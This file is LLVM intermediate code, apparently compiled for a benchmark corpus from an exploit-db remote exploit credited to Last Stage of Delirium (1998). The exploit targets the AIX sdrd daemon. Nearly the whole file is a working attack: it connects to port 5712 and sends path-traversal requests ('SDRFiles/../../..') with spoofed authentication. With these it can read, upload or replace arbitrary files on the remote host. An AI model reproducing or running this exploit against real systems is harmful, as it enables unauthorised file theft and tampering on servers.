; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19297.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19297.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.stat = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM oct 1998 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"sdrd for aix 4.1 4.2 PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [40 x i8] c"usage: %s address -g|-p|-r ifile ofile\0A\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"gpr\00", align 1
@optind = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"getting %s from %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [50 x i8] c"SDRFiles/../../../../../../../../../../../../..%s\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"3 %d %s\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"error: no file %s:%s\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [18 x i8] c"error: create %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c"putting %s to %s:%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [23 x i8] c"replace %s:%s with %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"8 18 0 %s:%d:1\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"error: auth\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [16 x i8] c"error: open %s\0A\00", align 1
@.str.15 = private unnamed_addr constant [41 x i8] c"SDRFiles/../../../../../../../../../..%s\00", align 1
@.str.16 = private unnamed_addr constant [20 x i8] c"error: memory alloc\00", align 1
@.str.17 = private unnamed_addr constant [9 x i8] c"2 %d %s \00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"19 %d %s \00", align 1
@.str.19 = private unnamed_addr constant [21 x i8] c"error: create %s:%s\0A\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"ok!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.hostent*, align 8
  %20 = alloca i32*, align 8
  %21 = alloca %struct.stat, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %16, align 4
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %24 = load i32, i32* %4, align 4
  %25 = icmp ne i32 %24, 5
  br i1 %25, label %26, label %32

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0), i8* %29)
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %2
  br label %33

33:                                               ; preds = %47, %32
  %34 = load i32, i32* %4, align 4
  %35 = sub nsw i32 %34, 1
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = call i32 @getopt(i32 %35, i8** %37, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  store i32 %38, i32* %14, align 4
  %39 = icmp ne i32 %38, -1
  br i1 %39, label %40, label %48

40:                                               ; preds = %33
  %41 = load i32, i32* %14, align 4
  switch i32 %41, label %45 [
    i32 103, label %42
    i32 112, label %43
    i32 114, label %44
  ]

42:                                               ; preds = %40
  store i32 1, i32* %16, align 4
  br label %47

43:                                               ; preds = %40
  store i32 2, i32* %16, align 4
  br label %47

44:                                               ; preds = %40
  store i32 3, i32* %16, align 4
  br label %47

45:                                               ; preds = %40
  %46 = call i32 @exit(i32 -1) #3
  unreachable

47:                                               ; preds = %44, %43, %42
  br label %33

48:                                               ; preds = %33
  %49 = load i32, i32* %16, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %53

51:                                               ; preds = %48
  %52 = call i32 @exit(i32 -1) #3
  unreachable

53:                                               ; preds = %48
  %54 = load i8**, i8*** %5, align 8
  %55 = load i32, i32* @optind, align 4
  %56 = add nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8*, i8** %54, i64 %57
  %59 = load i8*, i8** %58, align 8
  store i8* %59, i8** %8, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = load i32, i32* @optind, align 4
  %62 = add nsw i32 %61, 2
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8*, i8** %60, i64 %63
  %65 = load i8*, i8** %64, align 8
  store i8* %65, i8** %9, align 8
  %66 = load i32, i32* @AF_INET, align 4
  %67 = load i32, i32* @SOCK_STREAM, align 4
  %68 = call i32 @socket(i32 %66, i32 %67, i32 0)
  store i32 %68, i32* %12, align 4
  %69 = load i32, i32* @AF_INET, align 4
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  store i32 %69, i32* %70, align 4
  %71 = call i32 @htons(i32 5712)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i32 %71, i32* %72, align 4
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @inet_addr(i8* %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %78 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %77, i32 0, i32 0
  store i32 %76, i32* %78, align 4
  %79 = icmp eq i32 %76, -1
  br i1 %79, label %80, label %97

80:                                               ; preds = %53
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call %struct.hostent* @gethostbyname(i8* %83)
  store %struct.hostent* %84, %struct.hostent** %19, align 8
  %85 = icmp eq %struct.hostent* %84, null
  br i1 %85, label %86, label %90

86:                                               ; preds = %80
  %87 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %87, i32* @errno, align 4
  %88 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %89 = call i32 @exit(i32 -1) #3
  unreachable

90:                                               ; preds = %80
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %92 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i32 0, i32 0
  %93 = load %struct.hostent*, %struct.hostent** %19, align 8
  %94 = getelementptr inbounds %struct.hostent, %struct.hostent* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = call i32 @memcpy(i32* %92, i32 %95, i32 4)
  br label %97

97:                                               ; preds = %90, %53
  %98 = load i32, i32* %12, align 4
  %99 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %100 = call i64 @connect(i32 %98, %struct.sockaddr* %99, i32 12)
  %101 = icmp slt i64 %100, 0
  br i1 %101, label %102, label %105

102:                                              ; preds = %97
  %103 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %104 = call i32 @exit(i32 -1) #3
  unreachable

105:                                              ; preds = %97
  %106 = load i32, i32* %16, align 4
  switch i32 %106, label %318 [
    i32 1, label %107
    i32 2, label %169
    i32 3, label %176
  ]

107:                                              ; preds = %105
  %108 = load i8*, i8** %8, align 8
  %109 = load i8**, i8*** %5, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %108, i8* %111)
  %113 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %114 = load i8*, i8** %8, align 8
  %115 = call i32 (i8*, i8*, ...) @sprintf(i8* %113, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.6, i64 0, i64 0), i8* %114)
  %116 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %118 = call i32 @strlen(i8* %117)
  %119 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %116, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32 %118, i8* %119)
  %121 = load i32, i32* %12, align 4
  %122 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %123 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = call i32 @write(i32 %121, i8* %122, i32 %124)
  %126 = load i32, i32* %12, align 4
  %127 = call i32 @getresponse(i32 %126, i32* %15)
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %136

129:                                              ; preds = %107
  %130 = load i8**, i8*** %5, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 1
  %132 = load i8*, i8** %131, align 8
  %133 = load i8*, i8** %8, align 8
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0), i8* %132, i8* %133)
  %135 = call i32 @exit(i32 -1) #3
  unreachable

136:                                              ; preds = %107
  %137 = load i8*, i8** %9, align 8
  %138 = load i32, i32* @O_RDWR, align 4
  %139 = load i32, i32* @O_CREAT, align 4
  %140 = or i32 %138, %139
  %141 = call i32 (i8*, i32, ...) @open(i8* %137, i32 %140, i32 384)
  store i32 %141, i32* %17, align 4
  %142 = icmp slt i32 %141, 0
  br i1 %142, label %143, label %147

143:                                              ; preds = %136
  %144 = load i8*, i8** %9, align 8
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0), i8* %144)
  %146 = call i32 @exit(i32 -1) #3
  unreachable

147:                                              ; preds = %136
  br label %148

148:                                              ; preds = %160, %147
  %149 = load i32, i32* %15, align 4
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %168

151:                                              ; preds = %148
  %152 = load i32, i32* %12, align 4
  %153 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %154 = load i32, i32* %15, align 4
  %155 = call i32 @read(i32 %152, i8* %153, i32 %154)
  store i32 %155, i32* %13, align 4
  %156 = icmp slt i32 %155, 0
  br i1 %156, label %157, label %160

157:                                              ; preds = %151
  %158 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %159 = call i32 @exit(i32 -1) #3
  unreachable

160:                                              ; preds = %151
  %161 = load i32, i32* %17, align 4
  %162 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %163 = load i32, i32* %13, align 4
  %164 = call i32 @write(i32 %161, i8* %162, i32 %163)
  %165 = load i32, i32* %13, align 4
  %166 = load i32, i32* %15, align 4
  %167 = sub nsw i32 %166, %165
  store i32 %167, i32* %15, align 4
  br label %148

168:                                              ; preds = %148
  br label %318

169:                                              ; preds = %105
  %170 = load i8*, i8** %8, align 8
  %171 = load i8**, i8*** %5, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 1
  %173 = load i8*, i8** %172, align 8
  %174 = load i8*, i8** %9, align 8
  %175 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0), i8* %170, i8* %173, i8* %174)
  br label %183

176:                                              ; preds = %105
  %177 = load i8**, i8*** %5, align 8
  %178 = getelementptr inbounds i8*, i8** %177, i64 1
  %179 = load i8*, i8** %178, align 8
  %180 = load i8*, i8** %9, align 8
  %181 = load i8*, i8** %8, align 8
  %182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0), i8* %179, i8* %180, i8* %181)
  br label %183

183:                                              ; preds = %176, %169
  %184 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %185 = call i32 @gethostname(i8* %184, i32 1024)
  %186 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %187 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %188 = call i32 (...) @getpid()
  %189 = call i32 (i8*, i8*, ...) @sprintf(i8* %186, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0), i8* %187, i32 %188)
  %190 = load i32, i32* %12, align 4
  %191 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %192 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %193 = call i32 @strlen(i8* %192)
  %194 = call i32 @write(i32 %190, i8* %191, i32 %193)
  %195 = load i32, i32* %12, align 4
  %196 = call i32 @getresponse(i32 %195, i32* %15)
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %198, label %201

198:                                              ; preds = %183
  %199 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0))
  %200 = call i32 @exit(i32 -1) #3
  unreachable

201:                                              ; preds = %183
  %202 = load i8*, i8** %8, align 8
  %203 = load i32, i32* @O_RDONLY, align 4
  %204 = call i32 (i8*, i32, ...) @open(i8* %202, i32 %203)
  store i32 %204, i32* %17, align 4
  %205 = icmp slt i32 %204, 0
  br i1 %205, label %206, label %210

206:                                              ; preds = %201
  %207 = load i8*, i8** %8, align 8
  %208 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.14, i64 0, i64 0), i8* %207)
  %209 = call i32 @exit(i32 -1) #3
  unreachable

210:                                              ; preds = %201
  %211 = load i32, i32* %17, align 4
  %212 = call i32 @fstat(i32 %211, %struct.stat* %21)
  %213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %214 = load i8*, i8** %9, align 8
  %215 = call i32 (i8*, i8*, ...) @sprintf(i8* %213, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.15, i64 0, i64 0), i8* %214)
  %216 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %217 = call i32 @strlen(i8* %216)
  %218 = getelementptr inbounds %struct.stat, %struct.stat* %21, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = add nsw i32 %217, %219
  %221 = add nsw i32 %220, 32
  %222 = call i64 @malloc(i32 %221)
  %223 = inttoptr i64 %222 to i8*
  store i8* %223, i8** %10, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %228, label %225

225:                                              ; preds = %210
  %226 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.16, i64 0, i64 0))
  %227 = call i32 @exit(i32 -1) #3
  unreachable

228:                                              ; preds = %210
  %229 = load i32, i32* %16, align 4
  %230 = icmp eq i32 %229, 3
  br i1 %230, label %231, label %240

231:                                              ; preds = %228
  %232 = load i8*, i8** %10, align 8
  %233 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %234 = call i32 @strlen(i8* %233)
  %235 = getelementptr inbounds %struct.stat, %struct.stat* %21, i32 0, i32 0
  %236 = load i32, i32* %235, align 4
  %237 = add nsw i32 %234, %236
  %238 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %239 = call i32 (i8*, i8*, ...) @sprintf(i8* %232, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.17, i64 0, i64 0), i32 %237, i8* %238)
  br label %249

240:                                              ; preds = %228
  %241 = load i8*, i8** %10, align 8
  %242 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %243 = call i32 @strlen(i8* %242)
  %244 = getelementptr inbounds %struct.stat, %struct.stat* %21, i32 0, i32 0
  %245 = load i32, i32* %244, align 4
  %246 = add nsw i32 %243, %245
  %247 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %248 = call i32 (i8*, i8*, ...) @sprintf(i8* %241, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i32 %246, i8* %247)
  br label %249

249:                                              ; preds = %240, %231
  %250 = load i8*, i8** %10, align 8
  %251 = load i8*, i8** %10, align 8
  %252 = call i32 @strlen(i8* %251)
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i8, i8* %250, i64 %253
  store i8* %254, i8** %11, align 8
  %255 = getelementptr inbounds %struct.stat, %struct.stat* %21, i32 0, i32 0
  %256 = load i32, i32* %255, align 4
  store i32 %256, i32* %15, align 4
  br label %257

257:                                              ; preds = %269, %249
  %258 = load i32, i32* %15, align 4
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %260, label %277

260:                                              ; preds = %257
  %261 = load i32, i32* %17, align 4
  %262 = load i8*, i8** %11, align 8
  %263 = load i32, i32* %15, align 4
  %264 = call i32 @read(i32 %261, i8* %262, i32 %263)
  store i32 %264, i32* %13, align 4
  %265 = icmp slt i32 %264, 0
  br i1 %265, label %266, label %269

266:                                              ; preds = %260
  %267 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %268 = call i32 @exit(i32 -1) #3
  unreachable

269:                                              ; preds = %260
  %270 = load i32, i32* %13, align 4
  %271 = load i32, i32* %15, align 4
  %272 = sub nsw i32 %271, %270
  store i32 %272, i32* %15, align 4
  %273 = load i32, i32* %13, align 4
  %274 = load i8*, i8** %11, align 8
  %275 = sext i32 %273 to i64
  %276 = getelementptr inbounds i8, i8* %274, i64 %275
  store i8* %276, i8** %11, align 8
  br label %257

277:                                              ; preds = %257
  %278 = load i32, i32* %17, align 4
  %279 = call i32 @close(i32 %278)
  %280 = load i8*, i8** %11, align 8
  store i8 0, i8* %280, align 1
  %281 = load i32, i32* %12, align 4
  %282 = load i8*, i8** %10, align 8
  %283 = load i8*, i8** %10, align 8
  %284 = call i32 @strlen(i8* %283)
  %285 = call i32 @write(i32 %281, i8* %282, i32 %284)
  %286 = load i32, i32* %16, align 4
  %287 = icmp eq i32 %286, 3
  br i1 %287, label %288, label %306

288:                                              ; preds = %277
  br label %289

289:                                              ; preds = %301, %288
  %290 = load i32, i32* %15, align 4
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %305

292:                                              ; preds = %289
  %293 = load i32, i32* %12, align 4
  %294 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %295 = load i32, i32* %15, align 4
  %296 = call i32 @read(i32 %293, i8* %294, i32 %295)
  store i32 %296, i32* %13, align 4
  %297 = icmp slt i32 %296, 0
  br i1 %297, label %298, label %301

298:                                              ; preds = %292
  %299 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %300 = call i32 @exit(i32 -1) #3
  unreachable

301:                                              ; preds = %292
  %302 = load i32, i32* %13, align 4
  %303 = load i32, i32* %15, align 4
  %304 = sub nsw i32 %303, %302
  store i32 %304, i32* %15, align 4
  br label %289

305:                                              ; preds = %289
  br label %306

306:                                              ; preds = %305, %277
  %307 = load i32, i32* %12, align 4
  %308 = call i32 @getresponse(i32 %307, i32* %15)
  %309 = icmp ne i32 %308, 0
  br i1 %309, label %310, label %317

310:                                              ; preds = %306
  %311 = load i8**, i8*** %5, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 1
  %313 = load i8*, i8** %312, align 8
  %314 = load i8*, i8** %9, align 8
  %315 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0), i8* %313, i8* %314)
  %316 = call i32 @exit(i32 -1) #3
  unreachable

317:                                              ; preds = %306
  br label %318

318:                                              ; preds = %317, %105, %168
  %319 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0))
  %320 = load i32, i32* %17, align 4
  %321 = call i32 @close(i32 %320)
  %322 = load i32, i32* %3, align 4
  ret i32 %322
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @getresponse(i32, i32*) #1

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @gethostname(i8*, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @fstat(i32, %struct.stat*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
